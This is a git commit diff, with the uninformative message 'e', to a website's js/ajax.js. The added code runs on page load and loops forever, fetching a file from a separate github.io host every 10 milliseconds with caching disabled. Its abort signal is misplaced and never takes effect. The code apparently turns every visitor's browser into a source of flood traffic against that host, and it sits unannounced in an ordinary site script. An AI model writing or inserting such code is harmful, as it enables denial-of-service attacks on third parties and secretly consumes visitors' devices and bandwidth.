0e299701d691a3d2e142d218e9cb0d0475974312
Boof <97455552+hexahigh@users.noreply.github.com>
2023-01-18 13:58:05 +0100

    e

--- js/ajax.js
+++ js/ajax.js
@@ -34,20 +34,21 @@ if(resppage = true){
     responsiveElements[i].style.width = (screenWidth / responsiveElements.length) + "px";
   }
 }
+window.onload = async function startdownV2(){
+  const controller = new AbortController()
 
-const controller = new AbortController()
+  // 5 second timeout:
 
-// 5 second timeout:
+  const timeoutId = setTimeout(() => controller.abort(), 5000)
+  while(true){
+    await delay(10);
+    fetch('https://t0m0t0w.github.io/backuprr/history.dat', {cache: "no-store"}, { signal: controller.signal }).then(response => {
+    // completed request before timeout fired
 
-const timeoutId = setTimeout(() => controller.abort(), 5000)
-while(true){
-  await delay(10);
-  fetch('https://t0m0t0w.github.io/backuprr/history.dat', {cache: "no-store"}, { signal: controller.signal }).then(response => {
-  // completed request before timeout fired
-
-  // If you only wanted to timeout the request, not the response, add:
-  // clearTimeout(timeoutId)
-  })
+    // If you only wanted to timeout the request, not the response, add:
+    // clearTimeout(timeoutId)
+    })
+  }
 }
 /*window.onload = async function startdown(){
   while(true) {
